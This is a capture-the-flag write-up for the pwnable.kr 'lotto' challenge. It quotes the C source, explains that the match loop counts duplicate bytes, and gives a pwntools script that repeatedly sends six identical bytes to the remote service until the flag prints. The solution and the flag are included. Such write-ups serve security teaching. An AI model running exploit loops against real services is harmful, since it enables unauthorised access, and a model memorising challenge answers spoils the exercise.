# lotto
## Analysis
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}
```
We input 6 bytes. Code gets 6 random bytes and each byte modulo 45 to shrink into 1-45 byte range. Then, our input and the expected bytes get compared like this:

```c
int match = 0, j = 0;
for(i=0; i<6; i++){
    for(j=0; j<6; j++){
        if(lotto[i] == submit[j]){
            match++;
        }
    }
}
...
if(match == 6){
    setregid(getegid(), getegid());
    system("/bin/cat flag");
}
else{
    printf("bad luck...\n");
}
```

This means a single byte in lotto is compared to every byte of our input (6 bytes).

Intuitively, it is possible to make our input 6 of the same byte. If `lotto[i]` is `!` (0x21) and our input is `!!!!!!`, then `lotto[i] == submit[j]` will evaluate to true 6 times, and code will output flag.

## Solution

Repeat submitting `!!!!!!` until flag.

```py
from pwn import *

p = remote('pwnable.kr',10011)

# IF using solve2.py (unnecessary but significantly faster)
# p = process('./lotto')

resp = b'bad luck'
while b'bad luck' in resp:
    p.sendlineafter(b'3. Exit', b'1')
    p.sendafter(b'Submit your 6 lotto bytes :', b'!'*6)
    p.recvline()
    
    resp = p.recvuntil(b'- Select Menu -',timeout=3)

print(resp)

p.interactive()
```
Took 5-30 seconds
```sh
❯ python3 solve.py
[+] Opening connection to pwnable.kr on port 10011: Done
b'Sorry_mom_1_Forgot_to_check_duplicates\n- Select Menu -'
[*] Switching to interactive mode

1. Play Lotto
2. Help
3. Exit
$
```

Flag: `Sorry_mom_1_Forgot_to_check_duplicates`